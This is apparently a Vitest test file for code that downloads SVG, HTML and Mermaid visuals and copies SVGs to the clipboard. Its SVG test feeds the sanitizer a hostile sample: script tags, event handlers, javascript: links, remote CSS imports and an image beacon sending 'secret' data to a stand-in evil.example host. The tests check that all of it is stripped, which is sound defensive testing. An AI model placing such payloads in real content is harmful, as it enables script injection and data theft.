import { afterEach, describe, expect, it, vi } from "vitest";

import { copySvgImage, downloadVisual, inertSvg, sealedPage } from "./visual-actions";

const BASE = "https://content.example.com/api/v1/artifact-content/";

/** Download one visual and hand back the file the browser was given. */
async function downloaded(kind: "svg" | "html" | "mermaid", content: string) {
  vi.useFakeTimers();
  const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
  const created = vi.spyOn(URL, "createObjectURL").mockReturnValue("blob:x");
  const revoked = vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
  downloadVisual("Order flow", kind, content, BASE);
  const blob = created.mock.calls[0]![0] as Blob;
  const link = click.mock.contexts[0] as HTMLAnchorElement;
  // Revoked only after the click handler returns: Firefox and Safari read the URL then.
  expect(revoked).not.toHaveBeenCalled();
  vi.runAllTimers();
  expect(revoked).toHaveBeenCalledWith("blob:x");
  vi.useRealTimers();
  vi.restoreAllMocks();
  return { blob, name: link.download, text: await blob.text() };
}

describe("downloadVisual", () => {
  it("saves the drawing under a name made from its title", async () => {
    const file = await downloaded("mermaid", "graph TD");
    expect(file.blob.type).toBe("text/plain;charset=utf-8");
    expect(file.name).toBe("order-flow.mmd");
    expect(file.text).toBe("graph TD");
  });
});

describe("a downloaded page", () => {
  it("carries the frame's rules inside it, ahead of anything the page wrote", async () => {
    const file = await downloaded(
      "html",
      '<img src="https://evil.example/x"><html><head><title>R</title></head><body></body></html>',
    );
    expect(file.text).toMatch(/^<meta http-equiv="Content-Security-Policy"/);
    expect(file.text).toContain("connect-src 'none'");
    // The artifact origin the libraries come from, not the console's.
    expect(file.text).toContain(
      "script-src 'unsafe-inline' 'unsafe-eval' data: blob: https://content.example.com;",
    );
  });

  it("names its libraries where the frame serves them", () => {
    const page = sealedPage(
      '<script src="lib/chart-4.5.0.umd.min.js"></script><script type="importmap">{"imports":{"three":"lib/three.module.js"}}</script>',
      BASE,
    );
    expect(page).toContain(`src="${BASE}lib/chart-4.5.0.umd.min.js"`);
    expect(page).toContain(`"three":"${BASE}lib/three.module.js"`);
  });
});

describe("a downloaded SVG", () => {
  it("keeps the drawing and nothing that runs or reaches out", async () => {
    const file = await downloaded(
      "svg",
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="steal()">' +
        "<script>steal()</script>" +
        "<style>@import url(https://evil.example/a.css); rect { fill: url(#g); background: url(https://evil.example/b) }</style>" +
        '<a href="javascript:steal()"><rect width="2" height="1" onclick="steal()"/></a>' +
        '<circle r="1" fill="url(#g)" style="stroke: url(https://evil.example/c)"/>' +
        '<image href="https://evil.example/pixel?data=secret"/>' +
        '<use xlink:href="#shape"/>' +
        '<animate attributeName="href" to="javascript:steal()"/>' +
        '<foreignObject><iframe src="https://evil.example"/></foreignObject>' +
        "</svg>",
    );
    expect(file.blob.type).toBe("image/svg+xml;charset=utf-8");
    expect(file.text).not.toMatch(/steal|evil\.example|<script|<iframe|<animate/);
    expect(file.text).toContain("<rect");
    expect(file.text).toContain('xlink:href="#shape"');
    expect(file.text).toContain("url(#g)");
    expect(file.text).toContain('fill="url(#g)"');
    expect(file.text).toContain('style="stroke: none"');
  });

  it("saves nothing for an SVG the browser could not parse", () => {
    expect(inertSvg("<svg><unclosed></svg>")).toBe("");
  });
});

describe("copySvgImage", () => {
  // jsdom has no `decode`; the browser does, and it is what waits for the image.
  Object.defineProperty(HTMLImageElement.prototype, "decode", {
    configurable: true,
    value: () => Promise.resolve(),
  });
  afterEach(() => vi.restoreAllMocks());

  function canvasGives(context: unknown, png: Blob | null) {
    vi.spyOn(HTMLCanvasElement.prototype, "getContext").mockReturnValue(
      context as CanvasRenderingContext2D,
    );
    vi.spyOn(HTMLCanvasElement.prototype, "toBlob").mockImplementation((done) => done(png));
  }

  it("draws the SVG through an image, sized by its viewBox, onto the clipboard", async () => {
    vi.spyOn(URL, "createObjectURL").mockReturnValue("blob:svg");
    const revoked = vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
    const drawImage = vi.fn();
    canvasGives({ drawImage }, new Blob(["png"], { type: "image/png" }));
    const write = vi.fn().mockResolvedValue(undefined);
    Object.assign(navigator, { clipboard: { write } });
    vi.stubGlobal(
      "ClipboardItem",
      class {
        constructor(readonly items: Record<string, Blob>) {}
      },
    );

    await copySvgImage('<svg viewBox="0 0 100 50"></svg>');

    expect(drawImage).toHaveBeenCalledWith(expect.anything(), 0, 0, 2000, 1000);
    expect(write).toHaveBeenCalledTimes(1);
    expect(revoked).toHaveBeenCalledWith("blob:svg");
    vi.unstubAllGlobals();
  });

  it("fails when the browser gives no canvas, or no image", async () => {
    vi.spyOn(URL, "createObjectURL").mockReturnValue("blob:svg");
    vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
    canvasGives(null, null);
    await expect(copySvgImage("<svg/>")).rejects.toThrow();
    vi.restoreAllMocks();

    vi.spyOn(URL, "createObjectURL").mockReturnValue("blob:svg");
    vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
    canvasGives({ drawImage: vi.fn() }, null);
    await expect(copySvgImage("<svg/>")).rejects.toThrow();
  });
});
